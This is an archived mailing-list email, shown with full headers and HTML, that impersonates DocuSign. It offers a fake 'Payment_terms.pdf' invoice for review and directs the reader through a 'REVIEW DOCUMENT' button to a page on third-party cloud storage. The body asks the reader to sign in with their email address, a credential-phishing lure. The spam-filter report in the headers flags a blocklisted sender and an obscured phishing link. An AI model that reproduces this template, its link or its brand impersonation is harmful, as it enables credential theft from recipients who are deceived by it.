Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 41B83959084
	for <lists+industrypack-devel@lfdr.de>; Wed, 21 Aug 2024 00:33:10 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sgXPZ-0006oG-Ku
	for lists+industrypack-devel@lfdr.de;
	Tue, 20 Aug 2024 22:33:09 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <line@dalahora.com>) id 1sgXPY-0006oA-LD
 for industrypack-devel@lists.sourceforge.net;
 Tue, 20 Aug 2024 22:33:08 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=CQ7Ot76YdQOuKk3SQAlQzc3R1+yLKczfVugmolTEO90=; b=YRYfbHap71DuJMPdoc4puUF2vy
 ctckh6XzstPvfL/Hrvv/ROiszjH6OpvrIKNDiAPe/npd60ON8aSE5izNAzFP8+7jj/IoSmz1dzy97
 EtxQgkoVmkRLjGpZ4CGQe4hWBAVcwMM5l5EToJnHauco+lLgr69Ou7fYYG5DUOcBVVTI=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=CQ7Ot76YdQOuKk3SQAlQzc3R1+yLKczfVugmolTEO90=; b=G
 Dn4gUavwnsUYH8UF5CxCKENim0udRvuW+GbNL2czbCI117TZCkPospQWfP7K+Zx1R3kPm2P7WNFBn
 6VMEq7/jyqT53yuRg8YfJx9S3UGkG+K01RhyyOfUY5KZgRp9YWsMBgXkPPOqYuP9yzshLyrGtkUzg
 nqOYlm5duSB0weJw=;
Received: from squad.dalahora.com ([193.25.216.186])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1sgXPX-0008LN-4t for industrypack-devel@lists.sourceforge.net;
 Tue, 20 Aug 2024 22:33:07 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=dalahora.com;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
 i=line@dalahora.com; bh=sKp0brK/7N/yxrPeX83c/PPNVbs=;
 b=EUPa1RbceGrEuTazFZJMcMn9jBnVE3Ocj9GZC6+qetMUpRCsla9WZq0IzzoVmtmltu27wC2mIzRY
 BLbrHuuN+To8RfeWrte/GUu6dkl4KJ0hPXmtcOcN+vA46JgD9TMmCTQ5dbXTGWtWh6N7ROPThbFU
 95vqB9eE2CXZNY2lWJi2YLd+3Ntoz+UGnPnFpspEJPehO3x/xBW44Jn6IEU4ktJMRoPJVpLu4RJR
 gd5TPTF4Sm2NGndWmenFC7IAhFodZECAe7kz8SvQ+oe9vRDMVwJJnwMpmQ2ChFo8ErGT6GLKv1Ol
 Jdo8NPDbA06WG9yTBeJFJOp5Kgu73dcpObgoRA==
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=dalahora.com;
 b=p6ZeejtNn8Wn+9OOVzVTansBft1vtkp74Fww0z2Dg+MBPQAR1QNTmJHNXJR5ifqnKKEtz+BpNvsa
 S76ZQSVfp/y3LRYtiGqmPxxI+rXYLxl0HfPsoqHe1hr7f0p7/xlwpx+EunYgLVMvZGn9HFybCith
 fnwcjOAPfyDGkLRiNlZ5eUze0BiiQVyFupp0EYDYwSU3DQHi0XinHz43vPBSBQ05FlXPm3ooKT1h
 p3OwnWoIElSU9JTJTOpuxbxJbC7ps7hAseoSB0jSRQ1OX/eFtDhqimUEHk4H+soqiEnC2V00KbtA
 uh+OM3IDeB007dI/T9VzgQF58Ip1vf+v/Wa3Fg==;
From: =?UTF-8?B?RG9jdVNpZ24gfCBSZXZpZXcgdmlhIEUtc2lnbsKp?= <line@dalahora.com>
To: industrypack-devel@lists.sourceforge.net
Date: 20 Aug 2024 22:30:26 -0700
Message-ID: <20240820223026.3393F4AFAE8F7197@dalahora.com>
MIME-Version: 1.0
X-Spam-Score: 2.0 (++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: industrypack-devel@lists.sourceforge.net #30862911
 Payment_terms.pdf
 - Invoice online document is ready A copy to review via DocuSign Electronic
 Signature. REVIEW DOCUMENT 
 Content analysis details:   (2.0 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: dalahora.com]
 -5.0 RCVD_IN_DNSWL_HI       RBL: Sender listed at https://www.dnswl.org/,
 high trust [193.25.216.186 listed in list.dnswl.org]
 0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
 The query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [193.25.216.186 listed in sa-accredit.habeas.com]
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [193.25.216.186 listed in bl.score.senderscore.com]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 DATE_IN_FUTURE_06_12   Date: is 6 to 12 hours after Received: date
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 5.0 RCVD_IN_MSPIKE_BL      Mailspike blocklisted
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
 2.1 URI_GOOGLE_PROXY       Accessing a blacklisted URI or obscuring source
 of phish via Google proxy?
 0.0 RCVD_IN_MSPIKE_ZBI     No description available.
X-Headers-End: 1sgXPX-0008LN-4t
Subject: [Industrypack-devel] Complete #30862911 Payment_terms.pdf
 Authorization Signature-Updated
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8360730660070246810=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============8360730660070246810==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<STYLE type=3Dtext/css>
=2Eauto-style2 {
	color: #474A87;
}
=2Eauto-style3 {
	font-size: xx-small;
}
</STYLE>

<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.18817"></HEAD>
<BODY>
<DIV class=3D"adn ads" style=3D'FONT-SIZE: medium; FONT-FAMILY: "Google San=
s", Roboto, RobotoDraft, Helvetica, Arial, sans-serif; WHITE-SPACE: normal;=
 WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,3=
4,34); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-L=
EFT: 0px; BORDER-LEFT: medium none; ORPHANS: 2; WIDOWS: 2; DISPLAY: flex; L=
ETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,25=
5); TEXT-INDENT: 0px; font-variant-ligatures: normal;=20
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
thickness: initial; text-decoration-style: initial; text-decoration-color: =
initial' data-legacy-message-id=3D"18732cf3ef1f733d" data-message-id=3D"#ms=
g-f:1761801305432486717">
<DIV class=3Dgs style=3D"WIDTH: 864px; PADDING-BOTTOM: 20px; PADDING-TOP: 0=
px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
<DIV>
<DIV id=3D:1eg class=3D"ii gt" style=3D"POSITION: relative; PADDING-BOTTOM:=
 0px; DIRECTION: ltr; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 8px 0px =
0px; PADDING-RIGHT: 0px" jslog=3D"20277; u014N:xr6bB; 1:WyIjdGhyZWFkLWY6MTc=
2MTgwMTMwNTQzMjQ4NjcxN3xtc2ctZjoxNzYxODAxMzA1NDMyNDg2NzE3IixudWxsLG51bGwsbn=
VsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxbXV0.; 4:W=
yIjbXNnLWY6MTc2MTgwMTMwNTQzMjQ4NjcxNyIsbnVsbCxbXV0.">
<DIV id=3D:1ef class=3D"a3s aiL " style=3D"OVERFLOW: hidden; FONT: small/1.=
5 Arial, Helvetica, sans-serif">
<DIV>
<DIV id=3Dm_1786579613471354598ydpcde49f5cyahoo_quoted_0339161341>
<DIV style=3D'FONT-SIZE: 13px; FONT-FAMILY: "Helvetica Neue", Helvetica, Ar=
ial, sans-serif; COLOR: rgb(38,40,42)'>
<DIV>
<DIV id=3Dm_1786579613471354598ydpcde49f5cyiv5163102817>
<DIV>
<DIV id=3Dm_1786579613471354598ydpcde49f5cyiv5163102817yqt68399>
<DIV id=3Dm_1786579613471354598ydpcde49f5cyiv5163102817ydpb8c06f58yahoo_quo=
ted_8614756273>
<DIV style=3D'FONT-SIZE: 13px; FONT-FAMILY: "Helvetica Neue", Helvetica, Ar=
ial, sans-serif; COLOR: rgb(38,40,42)'>
<DIV>
<DIV id=3Dm_1786579613471354598ydpcde49f5cyiv5163102817ydpb8c06f58yiv271773=
6934>
<DIV>
<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" align=3Dcenter border=
=3D0>
<TBODY>
<TR>
<TD style=3D"MARGIN: 0px" width=3D640>
<TABLE style=3D"MAX-WIDTH: 640px; BORDER-COLLAPSE: collapse; BACKGROUND-COL=
OR: rgb(255,255,255)">
<TBODY>
<TR>
<TD style=3D"PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 24px; M=
ARGIN: 0px; PADDING-RIGHT: 24px"></TD></TR>
<TR>
<TD style=3D"PADDING-BOTTOM: 30px; PADDING-TOP: 0px; PADDING-LEFT: 24px; MA=
RGIN: 0px; PADDING-RIGHT: 24px">
<TABLE style=3D"COLOR: rgb(255,255,255); BACKGROUND-COLOR: rgb(0,46,59)" ce=
llSpacing=3D0 cellPadding=3D0 width=3D"100%" align=3Dcenter border=3D0>
<TBODY>
<TR>
<TD style=3D'FONT-SIZE: 16px; FONT-FAMILY: Helvetica, Arial, "Sans Serif"; =
WIDTH: 520px; COLOR: rgb(255,255,255); PADDING-BOTTOM: 36px; TEXT-ALIGN: ce=
nter; PADDING-TOP: 28px; PADDING-LEFT: 36px; MARGIN: 0px; PADDING-RIGHT: 36=
px; BACKGROUND-COLOR: rgb(0,46,59); border-radius: 2px' align=3Dcenter>
<IMG class=3DCToWUd style=3D"WIDTH: 75px; MIN-HEIGHT: 75px" src=3D"https://=
ci4.googleusercontent.com/proxy/NX1A7leTJhYqLBapajfOi9G4-543NGr76bPQA5hWe1-=
Yv8d0NGjGzR9thg4fr2i87PXrLIDkMHI_9XegTPLla_6egnnq3VxKmfxyuKB6TjcCpVbT=3Ds0-=
d-e1-ft#https://www.docusign.net/member/Images/email/docGeneric-white.png" =
width=3D75 height=3D75 data-bit=3D"iit">=20
<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
<TBODY>
<TR>
<TD style=3D'FONT-SIZE: 16px; BORDER-TOP: medium none; FONT-FAMILY: Helveti=
ca, Arial, "Sans Serif"; BORDER-RIGHT: medium none; BORDER-BOTTOM: medium n=
one; COLOR: rgb(255,255,255); TEXT-ALIGN: center; PADDING-TOP: 24px; MARGIN=
: 0px; BORDER-LEFT: medium none' align=3Dcenter>industrypack-devel@lists.so=
urceforge.net<BR><BR><STRONG>#30862911 Payment_terms.pdf &nbsp;- Invoice on=
line document is ready</STRONG><BR><BR><BR><SPAN class=3Dauto-style3>A copy=
 to review via DocuSign Electronic Signature.</SPAN></TD></TR></TBODY></TAB=
LE>
<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
<TBODY>
<TR>
<TD style=3D"PADDING-TOP: 30px; MARGIN: 0px" align=3Dcenter>
<DIV>
<TABLE style=3D"HEIGHT: 44px; WIDTH: 201px" cellSpacing=3D0 cellPadding=3D0=
>
<TBODY>
<TR>
<TD style=3D'FONT-SIZE: 15px; TEXT-DECORATION: none; FONT-FAMILY: Helvetica=
, Arial, "Sans Serif"; FONT-WEIGHT: bold; COLOR: rgb(36,31,33); TEXT-ALIGN:=
 center; MARGIN: 0px; DISPLAY: block; BACKGROUND-COLOR: rgb(67,222,149); bo=
rder-radius: 2px' height=3D44 align=3Dcenter>
<A style=3D'FONT-SIZE: 15px; TEXT-DECORATION: none; HEIGHT: 44px; FONT-FAMI=
LY: Helvetica, Arial, "Sans Serif"; WIDTH: 199px; FONT-WEIGHT: bold; COLOR:=
 rgb(36,31,33); TEXT-ALIGN: center; DISPLAY: inline-block; BACKGROUND-COLOR=
: rgb(67,222,149); border-radius: 2px' href=3D"https://eu2.contabostorage.c=
om/9dcf433f57d54040b5c59c8a0fdea5aa:docu/Scan_Docu.html#industrypack-devel@=
lists.sourceforge.net" shape=3Drect rel=3D"noreferrer noopener" target=3D_b=
lank=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://www.docusign=
=2Enet/signing/emails/v1-4d993a9d3c0b469296c9f37eaaf469944557f9fefffb4c2b88=
4b17e6014f9f03&amp;source=3Dgmail&amp;ust=3D1684578242683000&amp;usg=3DAOvV=
aw1HHdJaHQgnnoNjsrduWZJa"><SPAN style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: =
0px; PADDING-LEFT: 24px; LINE-HEIGHT: 44px; PADDING-RIGHT: 24px">REVIEW DOC=
UMENT</SPAN></A></TD></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE><=
/TD></TR></TBODY></TABLE></TD></TR>
<TR>
<TD style=3D'FONT-SIZE: 16px; FONT-FAMILY: Helvetica, Arial, "Sans Serif"; =
COLOR: rgb(0,0,0); PADDING-BOTTOM: 24px; PADDING-TOP: 0px; PADDING-LEFT: 24=
px; MARGIN: 0px; PADDING-RIGHT: 24px; BACKGROUND-COLOR: white'>
<P style=3D'FONT-SIZE: 15px; FONT-FAMILY: Helvetica, Arial, "Sans Serif"; C=
OLOR: rgb(51,51,51); LINE-HEIGHT: 20px'><STRONG>
Note: <SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: ArialMT, Arial, Helvetic=
a, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
; FLOAT: none; COLOR: rgb(74,74,74); FONT-STYLE: normal; ORPHANS: 2; WIDOWS=
: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: =
rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-va=
riant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickne=
ss: initial; text-decoration-style: initial;=20
text-decoration-color: initial">To view the secure message, click&nbsp;view=
&nbsp;your&nbsp;message. and follow the instructions Sign in using your </S=
PAN>
<SPAN class=3Dauto-style2 style=3D"FONT-SIZE: 14px; FONT-FAMILY: ArialMT, A=
rial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-T=
RANSFORM: none; FLOAT: none; FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; DIS=
PLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,=
255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-ca=
ps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: init=
ial; text-decoration-style: initial;=20
text-decoration-color: initial">industrypack-devel@lists.sourceforge.net</S=
PAN>
 <SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: ArialMT, Arial, Helvetica, sa=
ns-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLO=
AT: none; COLOR: rgb(74,74,74); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; =
DISPLAY: inline !important; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(2=
55,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: i=
nitial; text-decoration-style: initial;=20
text-decoration-color: initial">&nbsp;email address</SPAN>.</STRONG></P></T=
D></TR>
<TR>
<TD style=3D'FONT-SIZE: 11px; FONT-FAMILY: Helvetica, Arial, "Sans Serif"; =
COLOR: rgb(102,102,102); PADDING-BOTTOM: 12px; PADDING-TOP: 0px; PADDING-LE=
FT: 24px; MARGIN: 0px; PADDING-RIGHT: 24px; BACKGROUND-COLOR: rgb(255,255,2=
55)'>
<TABLE cellSpacing=3D0 cellPadding=3D0 border=3D0>
<TBODY>
<TR>
<TD style=3D'FONT-SIZE: 11px; FONT-FAMILY: Helvetica, Arial, "Sans Serif"; =
VERTICAL-ALIGN: top; COLOR: rgb(102,102,102); MARGIN: 0px' vAlign=3Dtop>
<DIV style=3D'FONT-SIZE: 11px; FONT-FAMILY: Helvetica, Arial, "Sans Serif";=
 COLOR: rgb(102,102,102); PADDING-BOTTOM: 0px; PADDING-TOP: 2px; PADDING-LE=
FT: 0px; PADDING-RIGHT: 5px'>Powered by</DIV></TD>
<TD style=3D"MARGIN: 0px"><IMG class=3DCToWUd style=3D"BORDER-TOP: medium n=
one; BORDER-RIGHT: medium none; BORDER-BOTTOM: medium none; BORDER-LEFT: me=
dium none" alt=3DDocuSign src=3D"https://ci4.googleusercontent.com/proxy/5c=
uCxX2hzv7w2iO_LKZiI3I-jjYjOpc9J6CmMYlAlwnKYvy4JoGCQmH1E5JbdtBhAXS3P3x7ik-9r=
HKDlOLOKKoAUkoxXNbWdSzLLxTLIK-B1BeQ9ww=3Ds0-d-e1-ft#https://www.docusign.ne=
t/Signing/Images/email/Email_PowerByLogo.png" height=3D19 data-bit=3D"iit">=
</TD></TR></TBODY></TABLE></TD></TR>
<TR>
<TD style=3D"PADDING-BOTTOM: 45px; PADDING-TOP: 30px; PADDING-LEFT: 24px; M=
ARGIN: 0px; PADDING-RIGHT: 24px; BACKGROUND-COLOR: rgb(234,234,234)">
<P style=3D'MARGIN-BOTTOM: 1em; FONT-SIZE: 13px; FONT-FAMILY: Helvetica, Ar=
ial, "Sans Serif"; COLOR: rgb(102,102,102); LINE-HEIGHT: 18px'><B>Do Not Sh=
are This Email</B><BR clear=3Dnone>This email contains a secure link to Doc=
uSign. Please do not share this email, link, or access code with others.</P=
>
<P style=3D'MARGIN-BOTTOM: 1em; FONT-SIZE: 13px; FONT-FAMILY: Helvetica, Ar=
ial, "Sans Serif"; COLOR: rgb(102,102,102); LINE-HEIGHT: 18px'><B>About Doc=
uSign</B><BR clear=3Dnone>Sign documents electronically in just minutes. It=
's safe, secure, and legally binding. Whether you're in an office, at home,=
 on-the-go -- or even across the globe -- DocuSign provides a professional =
trusted solution for Digital Transaction Management&#8482;.</P>
<P style=3D'MARGIN-BOTTOM: 1em; FONT-SIZE: 13px; FONT-FAMILY: Helvetica, Ar=
ial, "Sans Serif"; COLOR: rgb(102,102,102); LINE-HEIGHT: 18px'><B>Questions=
 about the Document?</B><BR clear=3Dnone>If you need to modify the document=
 or have questions about the details in the document, please reach out to t=
he sender by emailing them directly.</P>
<P style=3D'MARGIN-BOTTOM: 1em; FONT-SIZE: 10px; FONT-FAMILY: Helvetica, Ar=
ial, "Sans Serif"; COLOR: rgb(102,102,102); LINE-HEIGHT: 14px'>This message=
 was sent to industrypack-devel@lists.sourceforge.net who is using the Docu=
Sign Electronic Signature Service. If you would rather not receive email fr=
om this sender you may contact the sender with your request.</P></TD></TR><=
/TBODY></TABLE></TD>
<TD style=3D"MARGIN: 0px"></TD></TR></TBODY></TABLE></DIV></DIV></DIV></DIV=
></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></=
DIV></BODY></HTML>


--===============8360730660070246810==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============8360730660070246810==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============8360730660070246810==--
